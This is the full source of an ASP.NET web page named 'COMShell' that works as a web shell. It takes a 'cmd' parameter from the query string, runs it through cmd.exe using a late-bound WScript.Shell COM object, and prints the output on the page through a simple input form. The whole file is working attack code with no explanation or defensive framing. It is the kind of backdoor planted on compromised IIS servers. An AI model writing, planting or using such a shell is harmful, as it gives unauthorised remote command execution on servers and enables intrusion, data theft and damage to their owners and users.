<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            // Late-bound COM for WScript.Shell
            Type shellType = Type.GetTypeFromProgID("WScript.Shell");
            dynamic shell = Activator.CreateInstance(shellType);
            dynamic exec = shell.Exec("cmd.exe /c " + cmd);
            string output = exec.StdOut.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>
<html><body><h2>COMShell (late‑binding)</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
